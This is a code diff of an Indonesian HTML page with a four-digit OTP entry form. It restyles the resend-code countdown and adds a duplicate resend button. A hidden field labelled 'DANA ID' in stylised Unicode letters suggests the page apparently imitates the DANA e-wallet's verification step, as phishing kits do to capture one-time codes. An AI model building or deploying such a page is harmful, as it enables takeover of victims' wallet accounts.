@@ -512,9 +512,12 @@ Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Denga
 		<div type="button" class="clearotp"></div>
 		 <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
 					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
-		 <p id="waktuku" class="resend" style="margin-top: 70px; spacing: 2;color: #0f78cb; font-size: 13px">
-					Kirim Ulang (<span id="carasingkat" style="color: #0f78cb">60</span>s)
-				</p>
+		                         <p id="waktuku" class="resend" style="margin-top: 70px; color: #aaa; font-size: 13px">
+                            KIRIM ULANG (<span id="carasingkat" style="color: #aaa">60</span>s)
+                        </p>
+                        <p class="resend" style="margin-top: 70px; font-weight: 600; color: #2C86C5; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">
+                            KIRIM ULANG
+			</p>
        <p class="resend" style="margin-top: 70px; spacing: 2; font-weight: 600; color: #0f78cb; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">Kirim Ulang</p>
        
        
